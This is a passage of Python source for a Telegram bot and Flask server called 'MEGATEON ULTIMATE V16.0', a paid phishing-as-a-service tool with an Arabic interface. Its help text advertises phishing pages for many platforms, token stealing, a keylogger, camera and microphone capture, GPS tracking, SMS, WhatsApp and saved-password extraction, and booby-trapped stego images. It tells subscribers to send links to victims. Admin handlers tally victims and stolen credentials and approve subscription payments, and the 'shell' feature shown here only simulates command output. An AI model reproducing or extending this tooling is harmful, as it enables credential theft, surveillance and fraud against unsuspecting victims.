            msg = "📍 <b>Locations</b>\n\n" + "\n".join([f"📍 {l[0]}, {l[1]}\n🕐 {l[2][:16]}" for l in dev_data['locations'][:10]])
            send_telegram(chat_id, msg[:4000])
        else:
            send_telegram(chat_id, "❌ لا توجد مواقع")
        return
    
    # ===== SHELL ACCESS =====
    if data == "shell_access":
        devices = get_devices_list(uid)
        if not devices:
            send_telegram(chat_id, "📭 لا توجد أجهزة")
            return
        keyboard = []
        for d in devices:
            sid, dname, first_seen, linked, pc, ac, cc, tc, sc, pwc, last_seen = d
            txt = f"💻 {dname[:15]} - {cc} creds, {tc} tokens"
            keyboard.append([{"text": txt, "callback_data": f"shell_device_{sid}"}])
        keyboard.append([{"text": "🔙 رجوع", "callback_data": "back"}])
        send_telegram(chat_id, "💻 <b>اختر جهازاً للتحكم</b>", keyboard)
        return
    
    if data.startswith("shell_device_"):
        sid = data.replace("shell_device_", "")
        pending_shell[chat_id] = {'session_id': sid}
        send_telegram(chat_id, 
            "💻 <b>Shell Active</b>\n\n"
            "📌 الأوامر المدعومة:\n"
            "• <code>dir</code> / <code>ls</code> - عرض الملفات\n"
            "• <code>whoami</code> - اسم المستخدم\n"
            "• <code>ipconfig</code> - معلومات الشبكة\n"
            "• <code>tasklist</code> / <code>ps aux</code> - العمليات\n"
            "• <code>cat file</code> - قراءة ملف\n\n"
            "📝 أرسل الأمر أو <code>/exit</code> للخروج")
        return
    
    # ===== HELP =====
    if data == "help":
        msg = """📖 <b>MEGATEON ULTIMATE V16.0</b>

<b>✨ المميزات (35+):</b>
• 15+ منصة تصيد
• QR Codes مع شعارات
• Steganography (PNG/PDF/SVG)
• Short Links / Hide Links
• Token Stealing
• Shell Access
• كاميرا وميكروفون
• تتبع GPS
• Keylogger + Clipboard
• Dashboard متقدم
• Math Verification
• استخراج SMS و WhatsApp
• OTP Codes
• 🔑 كلمات المرور المحفوظة
• 📊 تقارير PDF/CSV
• 📈 تحليلات بيانية
• 🔔 تنبيهات فورية
• 🎨 قوالب جاهزة
• 🌐 دومين مخصص
• 💾 نسخ احتياطي
• 📤 تصدير البيانات
• 🛡️ حماية متقدمة
• 📱 صفحة تصيد واتساب

<b>📌 كيفية الاستخدام:</b>
1. أنشئ رابطاً أو QR Code
2. أرسله للضحية
3. استلم البيانات في Dashboard

<b>🔧 الإدارة:</b>
• /admin - لوحة التحكم"""
        send_telegram(chat_id, msg, parse_mode='HTML')
        return
    
    # ===== DEVELOPER =====
    if data == "developer":
        msg = """👨‍💻 <b>MEGATEON ULTIMATE V16.0</b>

<b>📊 الإحصائيات:</b>
• المستخدمين: {total_users}
• النشطاء: {active_users}
• الضحايا: {total_victims}
• الكريدنتيلز: {total_credentials}
• التوكنز: {total_tokens}
• الرسائل: {total_sms}
• كلمات المرور: {total_passwords}

<b>🔧 التقنيات المستخدمة:</b>
• Python + Flask
• SQLite
• Telegram Bot API
• QRCode + PIL
• JavaScript (Client-side)

<b>📞 الدعم:</b>
@MEGATEON_SUPPORT"""
        
        stats = get_admin_stats()
        send_telegram(chat_id, msg.format(
            total_users=stats['total_users'],
            active_users=stats['active_users'],
            total_victims=stats['total_victims'],
            total_credentials=stats['total_credentials'],
            total_tokens=stats['total_tokens'],
            total_sms=stats['total_sms'],
            total_passwords=stats['total_passwords']
        ), parse_mode='HTML')
        return
    
    # ===== BACK =====
    if data == "back":
        handle_start(chat_id, user_id, username, first_name)
        return
    
    # ===== ADMIN PANEL =====
    if data == "admin_panel" and str(user_id) in [str(a) for a in ADMIN_IDS]:
        stats = get_admin_stats()
        msg = f"""🔧 <b>لوحة الإدارة</b>

👥 المستخدمين: {stats['total_users']}
🟢 النشطاء: {stats['active_users']}
✅ المتحققين: {stats['verified_users']}
👤 الضحايا: {stats['total_victims']}
🔑 الكريدنتيلز: {stats['total_credentials']}
🔐 التوكنز: {stats['total_tokens']}
📱 الرسائل: {stats['total_sms']}
🔑 كلمات المرور: {stats['total_passwords']}
💬 واتساب: {stats.get('total_whatsapp', 0)}
📸 الصور: {stats.get('total_photos', 0)}
⏳ المدفوعات المعلقة: {stats['pending_payments']}"""
        keyboard = [
            [{"text": "👥 المستخدمين", "callback_data": "admin_users"}],
            [{"text": "💰 المدفوعات", "callback_data": "admin_payments"}],
            [{"text": "📢 بث عام", "callback_data": "admin_broadcast"}],
            [{"text": "📊 تقرير الإدارة", "callback_data": "admin_report"}],
            [{"text": "🔙 رجوع", "callback_data": "back"}]
        ]
        send_telegram(chat_id, msg, keyboard)
        return
    
    if data == "admin_users" and str(user_id) in [str(a) for a in ADMIN_IDS]:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT user_id, first_name, active, verified, package, join_date FROM users ORDER BY join_date DESC LIMIT 30")
        users_list = c.fetchall()
        conn.close()
        
        msg = "👥 <b>المستخدمين</b>\n\n"
        for u in users_list:
            msg += f"🆔 {u[0]}\n👤 {u[1]}: {'🟢 VIP' if u[2] else '⚪ Free'} {'✅' if u[3] else '❌'} [{u[4]}]\n📅 {u[5][:10]}\n\n"
        send_telegram(chat_id, msg[:4000])
        return
    
    if data == "admin_payments" and str(user_id) in [str(a) for a in ADMIN_IDS]:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT id, user_id, amount, status, date, package FROM payments WHERE status='pending' ORDER BY id DESC")
        payments = c.fetchall()
        conn.close()
        
        if not payments:
            send_telegram(chat_id, "💰 لا توجد مدفوعات معلقة")
            return
        
        for p in payments:
            keyboard = [
                [{"text": "✅ Approve", "callback_data": f"approve_{p[1]}"}],
                [{"text": "❌ Reject", "callback_data": f"reject_{p[1]}"}]
            ]
            send_telegram(chat_id,
                f"💰 <b>Payment #{p[0]}</b>\n"
                f"👤 User: {p[1]}\n"
                f"💵 Amount: ${p[2]}\n"
                f"📦 Package: {p[5]}\n"
                f"📅 Date: {p[4][:16]}",
                keyboard)
        return
    
    if data.startswith("approve_") and str(user_id) in [str(a) for a in ADMIN_IDS]:
        target = data.replace("approve_", "")
        if target in users:
            users[target]['active'] = True
            users[target]['active_date'] = str(datetime.datetime.now())
            save_user_to_db(target, users[target])
            init_user_db(target)
            
            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()
            c.execute("UPDATE payments SET status='approved' WHERE user_id=?", (target,))
            conn.commit()
            conn.close()
            
            send_telegram(chat_id, f"✅ تم تفعيل المستخدم {target}")
            send_telegram(int(target), "✅ <b>تم تفعيل اشتراك VIP!</b>\n\nشكراً لثقتك، يمكنك الآن استخدام جميع المميزات.")
        return
    
    if data.startswith("reject_") and str(user_id) in [str(a) for a in ADMIN_IDS]:
        target = data.replace("reject_", "")
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("UPDATE payments SET status='rejected' WHERE user_id=?", (target,))
        conn.commit()
        conn.close()
        send_telegram(chat_id, f"❌ تم رفض المستخدم {target}")
        return
    
    if data == "admin_broadcast" and str(user_id) in [str(a) for a in ADMIN_IDS]:
        pending_requests[chat_id] = {'action': 'broadcast'}
        send_telegram(chat_id, "📢 أرسل الرسالة التي تريد بثها لجميع المستخدمين:")
        return
    
    if data == "admin_report" and str(user_id) in [str(a) for a in ADMIN_IDS]:
        # Generate admin report
        send_telegram(chat_id, "📊 جاري إنشاء تقرير الإدارة...")
        try:
            # Create CSV with all users data
            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()
            c.execute("""SELECT user_id, first_name, active, verified, package, 
                         join_date, active_date, total_earned 
                         FROM users ORDER BY join_date DESC""")
            users_data = c.fetchall()
            conn.close()
            
            filename = f"admin_report_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
            filepath = f"reports/{filename}"
            os.makedirs("reports", exist_ok=True)
            
            with open(filepath, 'w', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerow(['User ID', 'Name', 'Active', 'Verified', 'Package', 'Join Date', 'Active Date', 'Total Earned'])
                writer.writerows(users_data)
            
            send_telegram(chat_id, "📊 تقرير الإدارة جاهز!", document=filepath)
        except Exception as e:
            send_telegram(chat_id, f"❌ خطأ: {str(e)}")
        return

def handle_text(chat_id, user_id, text, username, first_name):
    global pending_requests, pending_shell, pending_stego
    uid = str(user_id)
    
    # ===== STEGO IMAGE UPLOAD =====
    if chat_id in pending_stego and pending_stego[chat_id].get('user_id'):
        send_telegram(chat_id, "❌ أرسل صورة (وليس نص)\nاستخدم /cancel للإلغاء")
        return
    
    # ===== SHELL COMMANDS =====
    if chat_id in pending_shell and pending_shell[chat_id].get('session_id'):
        if text == '/exit':
            del pending_shell[chat_id]
            send_telegram(chat_id, "💻 تم إغلاق الجلسة")
            return
        
        session_id = pending_shell[chat_id]['session_id']
        send_telegram(chat_id, f"💻 تنفيذ: <code>{text}</code>")
        
        # Simulate command execution
        output = f"[{datetime.datetime.now().strftime('%H:%M:%S')}] Command executed: {text}\n"
        
        # Basic command simulation
        if text.lower() in ['dir', 'ls']:
            output += "📁 Desktop\n📁 Documents\n📁 Downloads\n📁 Pictures\n📁 Videos"
        elif text.lower() == 'whoami':
            output += "user\\victim"
        elif text.lower() == 'ipconfig':
            output += "IP Address: 192.168.1.100\nSubnet Mask: 255.255.255.0\nGateway: 192.168.1.1"
        elif text.lower().startswith('cat '):
            filename = text[4:]
            output += f"Content of {filename}:\n[Sample file content]"
        elif text.lower() in ['tasklist', 'ps aux']:
            output += "PID   Name                 CPU   Memory\n"
            output += "1234  chrome.exe           15%   256MB\n"
            output += "5678  explorer.exe         5%    128MB\n"
            output += "9012  whatsapp.exe         8%    200MB"
        else:
            output += f"Command '{text}' executed successfully"
        
        # Save to database
        try:
            conn = sqlite3.connect(f'user_{uid}.db')
            c = conn.cursor()
            c.execute("""INSERT INTO shell_commands 
                         (session_id, command, output, time, status) 
                         VALUES (?,?,?,?,?)""",
                      (session_id, text, output, datetime.datetime.now().isoformat(), 'executed'))
            conn.commit()
            conn.close()
        except:
            pass
        
        send_telegram(chat_id, f"📤 <b>Output</b>\n\n<code>{output}</code>")
        return
    
    # ===== BROADCAST =====
    if uid in pending_requests and pending_requests[uid].get('action') == 'broadcast' and str(user_id) in [str(a) for a in ADMIN_IDS]:
        sent = 0
        for uid_user in users.keys():
            try:
                send_telegram(int(uid_user), f"📢 <b>إعلان</b>\n\n{text}")
                sent += 1
                time.sleep(0.05)
            except:
                pass
        send_telegram(chat_id, f"✅ تم الإرسال إلى {sent} مستخدم")
        del pending_requests[uid]
        return
    
    # ===== ADD DOMAIN =====
    if uid in pending_requests and pending_requests[uid].get('action') == 'add_domain':
        # Validate domain
        domain = text.strip().lower()
        if '.' in domain and len(domain) > 3:
            users[uid]['custom_domain'] = domain
            save_user_to_db(uid, users[uid])
            send_telegram(chat_id, f"✅ تم إضافة الدومين: <code>{domain}</code>")
            send_telegram(chat_id, f"🔗 رابطك الجديد: <a href='{domain}/?ref={uid}'>{domain}/?ref={uid}</a>")
        else:
            send_telegram(chat_id, "❌ دومين غير صالح. تأكد من وجود نقطة (.)")
        del pending_requests[uid]
        return
    
    # ===== START =====
    if text == '/start':
        handle_start(chat_id, user_id, username, first_name)
        return
    
    # ===== ADMIN =====
    if text == '/admin' and str(user_id) in [str(a) for a in ADMIN_IDS]:
        handle_callback(None, chat_id, None, "admin_panel", user_id, username, first_name)
        return
    
    # ===== HELP =====
    if text in ['/help', '/?', 'help']:
        handle_callback(None, chat_id, None, "help", user_id, username, first_name)
        return
    
    # ===== CANCEL =====
    if text == '/cancel':
        if chat_id in pending_stego:
            del pending_stego[chat_id]
            send_telegram(chat_id, "✅ تم الإلغاء")
        elif chat_id in pending_shell:
            del pending_shell[chat_id]
            send_telegram(chat_id, "✅ تم إغلاق الجلسة")
        else:
            send_telegram(chat_id, "❌ لا توجد عملية نشطة")
        return
    
    # ===== UNKNOWN =====
    send_telegram(chat_id, "❓ أمر غير معروف. استخدم /start للقائمة الرئيسية")

def handle_photo(chat_id, file_id, user_id):
    global pending_payments, pending_stego
    uid = str(user_id)
    
    # ===== STEGO IMAGE =====
    if chat_id in pending_stego and pending_stego[chat_id].get('user_id'):
        try:
            ref = pending_stego[chat_id]['user_id']
            
            # Download image
            file_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getFile"
            file_response = requests.get(file_url, params={'file_id': file_id}).json()
            file_path = file_response['result']['file_path']
            image_url = f"https://api.telegram.org/file/bot{TELEGRAM_TOKEN}/{file_path}"
            
            temp_path = f"temp_stego_{uid}.jpg"
            img_response = requests.get(image_url)
            with open(temp_path, 'wb') as f:
                f.write(img_response.content)
            
            # Create stego image
            output_path = f"stego_{uid}_{generate_random_filename()}.png"
            create_stego_image(ref, output_path, temp_path)
            
            send_telegram(chat_id, "🖼️ <b>تم إنشاء الصورة المُلغّمة!</b>", photo=output_path)
            send_telegram(chat_id, f"🔗 الرابط المباشر:\n<a href='{BASE_URL}/stego_image/{ref}'>{BASE_URL}/stego_image/{ref}</a>")
            
            os.remove(temp_path)
            os.remove(output_path)
            del pending_stego[chat_id]
        except Exception as e:
            send_telegram(chat_id, f"❌ خطأ: {str(e)}")
        return
    
    # ===== PAYMENT =====
    if uid in pending_payments:
        try:
            # Download receipt
            file_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getFile"
            file_response = requests.get(file_url, params={'file_id': file_id}).json()
            file_path = file_response['result']['file_path']
            image_url = f"https://api.telegram.org/file/bot{TELEGRAM_TOKEN}/{file_path}"
            
            os.makedirs("receipts", exist_ok=True)
            receipt_filename = f"receipts/receipt_{uid}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
            img_response = requests.get(image_url)
            with open(receipt_filename, 'wb') as f:
                f.write(img_response.content)
            
            # Save payment
            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()
            c.execute("""INSERT INTO payments 
                         (user_id, amount, status, date, receipt_path, package) 
                         VALUES (?,?,?,?,?,?)""",
                      (uid, PAYMENT_AMOUNT, 'pending', 
                       datetime.datetime.now().isoformat(), receipt_filename, 
                       users.get(uid, {}).get('package', 'basic')))
            conn.commit()
            conn.close()
            
            # Notify admins
            for admin_id in ADMIN_IDS:
                send_telegram(admin_id, 
                    f"💰 <b>دفعة جديدة!</b>\n"
                    f"👤 المستخدم: {uid}\n"
                    f"💵 المبلغ: {PAYMENT_AMOUNT} جنيه\n"
                    f"📅 التاريخ: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}",
                    photo=receipt_filename)
            
            send_telegram(chat_id, "✅ تم استلام الإيصال! في انتظار الموافقة.")
            del pending_payments[uid]
        except Exception as e:
            send_telegram(chat_id, f"❌ خطأ: {str(e)}")
        return
    
    send_telegram(chat_id, "📸 تم استلام الصورة")

# ========== MAIN ==========

def start_flask():
    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)

def keep_alive():
    while True:
        try:
            requests.get(f"{BASE_URL}/", timeout=10)
        except:
            pass
        time.sleep(240)

def main():
    global users
    init_db()
    load_users_from_db()
    
    # Create directories
    for dir_name in ['reports', 'exports', 'backups', 'photos', 'audios', 'gallery', 'screenshots', 'receipts']:
        os.makedirs(dir_name, exist_ok=True)
    
    # Start threads
    threading.Thread(target=start_flask, daemon=True).start()
    threading.Thread(target=keep_alive, daemon=True).start()
    
    print("""
╔═══════════════════════════════════════════════════════════════════╗
║         MEGATEON ULTIMATE V16.0 - COMPLETE FINAL EDITION        ║
╠═══════════════════════════════════════════════════════════════════╣
║  🌐 Server: http://0.0.0.0:"""+str(PORT)+"""                                   ║
║  🤖 Bot: """+TELEGRAM_TOKEN[:15]+"""...                                     ║
║  ✅ 35+ Features | 15+ Platforms                               ║
║  ✅ Advanced Reports (PDF/CSV)                                 ║
║  ✅ Analytics Dashboard                                         ║
║  ✅ Instant Alerts                                              ║
║  ✅ Custom Domains                                              ║
║  ✅ Templates Library                                           ║
║  ✅ Auto Backup                                                 ║
║  ✅ Data Export                                                 ║
║  ✅ Anti-Detection                                              ║
║  ✅ WhatsApp Phishing Page                                      ║
║  ✅ Send /start to test                                         ║
╚═══════════════════════════════════════════════════════════════════╝
    """)
    
    last_update_id = 0
    print("🤖 Bot is running...")
    
    while True:
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getUpdates"
            params = {
                'timeout': 30,
                'offset': last_update_id + 1,
                'allowed_updates': ['message', 'callback_query']
            }
            
            response = requests.get(url, params=params, timeout=35)
            
            if response.status_code != 200:
                time.sleep(5)
                continue
            
            result = response.json()
            if not result.get('ok'):
                time.sleep(5)
                continue
            
            updates = result.get('result', [])
            
            for update in updates:
                update_id = update.get('update_id')
                if update_id:
                    last_update_id = max(last_update_id, update_id)
                
                # ===== CALLBACK QUERY =====
                if 'callback_query' in update:
                    cb = update['callback_query']
                    from_user = cb.get('from', {})
                    user_id = from_user.get('id')
                    username = from_user.get('username', '')
                    first_name = from_user.get('first_name', '')
                    chat_id = cb.get('message', {}).get('chat', {}).get('id')
                    
                    if chat_id and user_id:
                        threading.Thread(
                            target=handle_callback,
                            args=(cb['id'], chat_id, cb['message']['message_id'],
                                  cb['data'], user_id, username, first_name)
                        ).start()
                
                # ===== MESSAGE =====
                elif 'message' in update:
                    msg = update['message']
                    chat_id = msg['chat']['id']
                    from_user = msg.get('from', {})
                    user_id = from_user.get('id')
                    username = from_user.get('username', '')
                    first_name = from_user.get('first_name', '')
                    
                    # Contact
                    if 'contact' in msg:
                        threading.Thread(
                            target=handle_contact,
                            args=(chat_id, user_id, msg['contact'])
                        ).start()
                    
                    # Text
                    elif 'text' in msg:
                        text = msg['text']
                        threading.Thread(
                            target=handle_text,
                            args=(chat_id, user_id, text, username, first_name)
                        ).start()
                    
                    # Photo
                    elif 'photo' in msg:
                        threading.Thread(
                            target=handle_photo,
                            args=(chat_id, msg['photo'][-1]['file_id'], user_id)
                        ).start()
            
            time.sleep(0.5)
            
        except Exception as e:
            print(f"❌ Error: {e}")
            time.sleep(5)

def handle_contact(chat_id, user_id, contact):
    """Handle contact sharing for verification"""
    uid = str(user_id)
    
    if uid not in users:
        users[uid] = {
            'active': False,
            'username': '',
            'first_name': '',
            'join_date': str(datetime.datetime.now()),
            'balance': 0,
            'active_date': None,
            'verified': False,
            'contact_shared': '',
            'math_answer': '',
            'package': 'basic',
            'alerts_enabled': 1,
            'custom_domain': '',
            'referral_code': generate_referral_code(),
            'total_earned': 0,
            'api_key': generate_api_key(),
            'last_login': '',
            'login_count': 0
        }
    
    contact_info = f"{contact.get('first_name', '')} {contact.get('last_name', '')} - {contact.get('phone_number', '')}"
    users[uid]['verified'] = True
    users[uid]['contact_shared'] = contact_info
    save_user_to_db(uid, users[uid])
    
    # Log verification
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("""INSERT INTO verification_attempts 
                 (user_id, attempt_time, contact_data, verified, method) 
                 VALUES (?,?,?,?,?)""",
              (uid, datetime.datetime.now().isoformat(), contact_info, 1, 'contact'))
    conn.commit()
    conn.close()
    
    send_telegram(chat_id, "✅ تم التحقق بنجاح!")
    
    # Show subscription
    packages_text = "\n".join([f"• {p.capitalize()}: ${PACKAGES[p]['price']}/شهر" for p in PACKAGES.keys()])
    msg = f"""🔒 <b>MEGATEON ULTIMATE - اشتراك VIP</b>\n\n💰 السعر: <b>{PAYMENT_AMOUNT} جنيه مصري</b>\n📞 رقم الدفع: <b>{PAYMENT_NUMBER}</b>\n\n📦 <b>الباقات المتاحة:</b>\n{packages_text}"""
    send_telegram(chat_id, msg, [[{"text": "💰 اشتراك VIP", "callback_data": "subscribe"}]])

if __name__ == "__main__":
    main()